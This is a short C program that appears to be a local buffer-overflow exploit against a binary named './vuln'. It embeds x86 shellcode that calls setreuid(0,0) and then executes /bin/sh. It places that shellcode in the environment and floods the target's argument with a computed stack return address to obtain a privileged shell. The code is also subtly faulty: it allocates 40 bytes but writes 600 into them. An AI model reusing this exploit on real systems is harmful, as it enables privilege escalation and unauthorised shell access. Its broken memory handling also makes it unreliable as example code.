#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = 
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68";

int main (int argc, char *argv[])
{
    char *env[2] = {shellcode, NULL};
    int i = 0;
    long ret = 0;
    long *addr_ptr = NULL;
    char *buffer = NULL;
    char *ptr = NULL;

    buffer = malloc (40);

    ret = 0xbffffffa - strlen(shellcode) - strlen("./vuln");

    ptr = buffer;
    addr_ptr = (long *)ptr;
    for (i = 0; i < 600; i +=4) {
        *(addr_ptr++) = ret;
    }

    buffer[600-1] = 0;

    execle("./vuln", "vuln", buffer, 0, env);

    free(buffer);
    return 0;
}
